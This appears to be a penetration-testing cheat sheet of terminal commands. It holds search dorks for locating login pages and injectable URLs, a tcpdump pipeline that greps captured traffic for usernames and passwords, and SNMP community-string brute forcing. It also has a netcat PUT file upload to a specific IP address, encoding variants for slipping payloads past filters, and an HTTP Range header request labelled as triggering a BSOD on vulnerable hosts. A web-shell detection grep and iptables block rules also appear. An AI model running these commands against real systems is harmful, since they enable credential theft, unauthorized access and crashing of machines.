# <img width="28" src="http://0z3r00t3r.6te.net/img/folder.png"> Terminal / Other
##### &#x1F538;  VPN config (term) :
`sudo openvpn --config vpnbook-euro2-tcp80.ovpn`

##### &#x1F538;  BEST DORK FOR Bing.com : 
    -site:.com intitle:login.page inbody:"User Login"
    intitle:login.page inbody:"User Login" instreamset:url:".php"
    intitle:"Admin Login" inbody:"login"
    intitle:"User Login" instreamset:url:login.php?id=
    intitle:"News" instreamset:url:news_id.php?id=
    inbody:"login" instreamset:url:sa/index.php?id=
    
    
##### &#x1F538; SSLscan Show full certificate information : 
`sslscan --http --bugs --verbose --show-certificate target.com`
    
##### &#x1F538; TCPdump eGrep username / password : 
`sudo tcpdump -A -i any -w loging.pcap | egrep -i 'username=|password=' --line-buffered -B20`

    sudo /usr/sbin/tcpdump -Nnn -i any -s0 'tcp[13] & 1 != 0'
    #Block ip : 
     - sudo iptables -A INPUT -s IP -j DROP
     - sudo /usr/sbin/tcpdump host <ip>	#check the ip traffic
     - sudo /usr/sbin/tcpdump portrange 80-137-443-445		#check port range between 80-445
     - sudo /usr/sbin/tcpdump src 10.0.0.13 and dst port 80 or 22	#traffic that from ip and port 
    

##### &#x1F538; AnyCMD : 
    #resolve websites
    - pnscan -v -s -t10 <TARGET>/24 80
    - dmitry -winsepo output.txt <TARGET>
    
    #check vm with crunch list install (sudo apt intall onesixtyone)
    - crunch 4 4 ad12 > smpList
    - onesixtyone -c smpList -d <TARGET>
    - snmpcheck -c smpList -d <TARGET>
    
    #TCP, UDP open ports in real time with socket summary
    - watch ss -stplu
    
    #view established connections
    - lsof -i
    - #looking for cracks:google:(Xxxx)" 94fbr)
    #Adding random word before list ex: admin -> will be -> 9xadmin,eqadmin,ifadmin:
    - paste <(base64 -w2 /dev/urandom) user_list.txt | awk 'NF==2{print $1$2} NF!=2{exit}'
    
##### &#x1F538; Grep / Find String : 
    #find inside any file and print it 
    - find /usr/share -iname '*SQLMAP*' -print
    - find /var/www/ -name "*.php"
    - find /home -type f -name '*.php' -mtime -7
    - find /var/www/html/ -type d -perm 755 -exec find {} -name "*.zip" \;
    - find / -xdev -type f -size +100M -exec ls -la {} \; | sort -nk 5
    - find . -name "*.sql"
    #Remove space between lines in file.txt / a.json result
    - sed '/^ *$/d' a1.json > output.txt
    
#### &#x1F538; Reading files end with php and search for Shell :
    grep '((eval.*(base64_decode|gzinflate|\$_))|\$[0O]{4,}|FilesMan|JGF1dGhfc|IIIl|die\(PHP_OS|posix_getpwuid|Array\(base64_decode|document\.write\("\\u00|sh(3(ll|11)))' . -lroE --include=*.php*

##### &#x1F538; SCAN Methods With openssl
    #Open terminal and type : 
        - openssl s_client -connect <TARGET:443>
    #Hit enter twice and enter :    
        OPTIONS / HTTP/1.1
        Host: <TARGET>

##### &#x1F538; PUT FILE WITH NetCat
    nc 190.115.18.139 80
    PUT /x.txt HTTP/1.1
    Host: 190.115.18.139



### &#x1F538; Hashed Type : 
    Urlencode : wef
    Double Urlencode : wef
    Base 64 : dDR0ZWFt
    Uri Hexadecimal : %74%34%74%65%61%6d
    Random upper : wef
    Double nibble hexa : %%37%34%%33%34%%37%34%%36%35%%36%31%%36%64
    SHA1 : 376ccc0db6534301362711e1fbc455f9710b447a
    MD5 : 7c3a9746c0bb3c99f4877edbbf6d3690
    Binary Ascii : 74347465616d
    Html Decimal : &#116;&#52;&#116;&#101;&#97;&#109;
    Html Hexadecimal : &#x74;&#x34;&#x74;&#x65;&#x61;&#x6d;
    UTF-8 Binary : \x74\x34\x74\x65\x61\x6d
    UTF-8 : \u0074\u0034\u0074\u0065\u0061\u006d
    Mysql char : CHAR(116,52,116,101,97,109)
    MSsql char : CHAR(116)+CHAR(52)+CHAR(116)+CHAR(101)+CHAR(97)+CHAR(109)
    All : CHAR(116)+CHAR(52)+CHAR(116)+CHAR(101)+CHAR(97)+CHAR(109)


##### &#x1F538; Check If return [Requested Range Not Satisfiable] means vulnerable :
    wget --header="Range: bytes=0-18446744073709551615" http://<TARGET/FILE.FILE
##### &#x1F538; Check if [BSOD] Vulnerable systems:
    wget --header="Range: bytes=18-18446744073709551615" http://<TARGET/FILE.FILE
##### &#x1F538; Stop ip / Block :
    sudo iptables -A INPUT 1 -s IP-ADDRESS-DDOS-HACKER-HERE -j DROP/REJECT
    sudo iptables-save 
   
    #Block IPs#4v3r
    - iptables -A INPUT -s xxxxxx -j DROP
    - iptables -A INPUT -s xxxxxxx -j DROP
    - iptables -A INPUT -s xxxxxxxx -p tcp --destination-port 80 -j DROP
    - iptables -A INPUT -s xxxxxxxx -p tcp --destination-port 443 -j DROP
